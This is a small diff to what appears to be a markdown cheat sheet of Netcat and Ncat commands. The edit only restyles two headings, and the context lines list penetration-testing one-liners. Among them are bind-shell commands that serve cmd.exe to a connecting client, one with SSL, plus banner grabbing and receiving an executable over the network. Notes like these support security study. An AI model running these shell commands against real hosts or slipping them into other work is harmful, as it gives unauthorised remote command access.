@@ -1,4 +1,4 @@
-*Netcat*  
+_Netcat_  
 nc -nv TargetIP port  #connect to port,client/banner grab  
 nc -nlvp 4444  #start netcat server  
 
@@ -8,6 +8,6 @@ nc -nlvp 4444 > incoming.exe #receive file from client pipe into exe
 nc -lvp 4444 -e cmd.exe #bind shell server  
 nc -vn TargetIP 4444 #bind shell client  
 
-*Ncat*  
+_Ncat_  
 ncat -lvp 4444 -e cmd.exe --allow ClientIP --ssl #ncat server bind shell only to clientip with ssl encryption  
 ncat -v ServerIP 4444 --ssl #client connect bind 
